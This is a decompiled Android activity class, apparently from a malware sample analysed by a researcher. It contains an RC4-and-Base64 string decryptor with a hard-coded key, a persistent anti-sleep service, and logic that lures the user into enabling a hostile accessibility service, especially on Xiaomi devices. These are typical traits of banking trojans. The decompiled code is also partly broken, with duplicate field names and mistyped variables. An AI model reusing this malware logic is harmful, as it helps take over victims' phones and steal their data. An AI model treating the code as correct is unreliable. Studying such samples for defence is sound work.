/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Point
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.util.Base64
 *  android.view.Display
 *  android.view.WindowManager
 */
package com.example.mmm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Point;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.Display;
import android.view.WindowManager;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Activity.actToaskAccessibility;
import com.example.mmm.Service.srvAccessibility;
import com.example.mmm.Service.srvAntiSleep;
import com.example.mmm.Utils.utils;
import com.example.mmm.Utils.utils2;
import com.example.mmm.constants;

/*
 * Duplicate member names - consider using --renamedupmembers true
 */
public class mainActivity
extends Activity {
    utils utl;
    utils2 seven$ = new utils2();
    constants utl = new constants();
    private String TAG_LOG;

    public mainActivity() {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(mainActivity.class.getSimpleName());
        stringBuilder.append("    ");
        this.TAG_LOG = stringBuilder.toString();
    }

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        bundle = new Point();
        this.getWindowManager().getDefaultDisplay().getSize((Point)bundle);
        utils utils3 = this.utl;
        String string = "SW";
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(bundle.x);
        utils3.SettingsWrite((Context)this, string, stringBuilder.toString());
        utils3 = this.utl;
        string = "SE";
        stringBuilder = new StringBuilder();
        stringBuilder.append(bundle.y);
        utils3.SettingsWrite((Context)this, string, stringBuilder.toString());
        if (this.utl.SettingsRead((Context)this, "QW").contains("good")) {
            this.utl.Log(this.TAG_LOG, "Initialization Start 2!");
        }
        utils.startCustomTimer((Context)this, "", 10000L);
        this.utl._currency((Context)this);
        if (this.utl.meters$ && !this.utl.SettingsRead((Context)this, "EL").equals("start")) {
            bundle = new Intent((Context)this, srvAntiSleep.class);
            bundle.setAction("start");
            if (Build.VERSION.SDK_INT >= 26) {
                this.utl.Log("Boot", "Starting the service in >=26 Mode from a BroadcastReceiver");
                this.startForegroundService((Intent)bundle);
            } else {
                this.utl.Log("Boot", "Starting the service in < 26 Mode from a BroadcastReceiver");
                this.startService((Intent)bundle);
            }
        }
        if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10) {
            if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                this.seven$._cornell((Context)this);
                if (!this.utl.SettingsRead((Context)this, "XB").equals("1")) return;
                if (!"".isEmpty()) {
                    this.startActivity(new Intent((Context)this, actToaskAccessibility.class).addFlags(268435456).addFlags(8388608));
                    return;
                }
                this.finish();
                return;
            }
            if (this.utl.regional$) {
                this.startActivity(new Intent((Context)this, actToaskAccessibility.class));
                return;
            }
            this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
            return;
        }
        if (!"".isEmpty()) {
            this.startActivity(new Intent((Context)this, actToaskAccessibility.class).addFlags(268435456).addFlags(8388608));
            return;
        }
        this.finish();
    }

    public void onPause() {
        super.onPause();
    }

    public void onStop() {
        super.onStop();
    }
}

